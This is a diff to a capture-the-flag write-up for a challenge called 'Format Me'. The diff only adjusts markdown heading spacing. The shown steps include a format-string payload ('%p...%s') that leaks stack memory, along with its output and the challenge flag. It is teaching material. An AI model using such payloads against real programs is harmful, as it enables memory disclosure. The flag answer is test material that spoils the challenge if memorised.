@@ -1,7 +1,7 @@
-##Format Me
+## Format Me
 Can you please format me to obtain the flag?
 
-###Solution
+### Solution
 
 1.  chmod +x format
 2.  gdb format
@@ -15,9 +15,9 @@ Can you please format me to obtain the flag?
 10. this is the complete flag but in disintegrated addresess 
 11. To leak the string form input %p%p%p%p%p%p%s >> 0x10x7f03a7a9f8d00x7a667f0x7f03a7a9f8c0(nil)0x7ffd68727140enc0re{f0rm4t_5tr1n6_vuln3r4b1l1ty}
 
-###Flag
+### Flag
 **Flag:** enc0re{f0rm4t_5tr1n6_vuln3r4b1l1ty}
 
-###Hints
+### Hints
 Ahh there are kite strings all over the place cutting people's feet. I was planning to format my phone but you know,
 vulnerable people priority
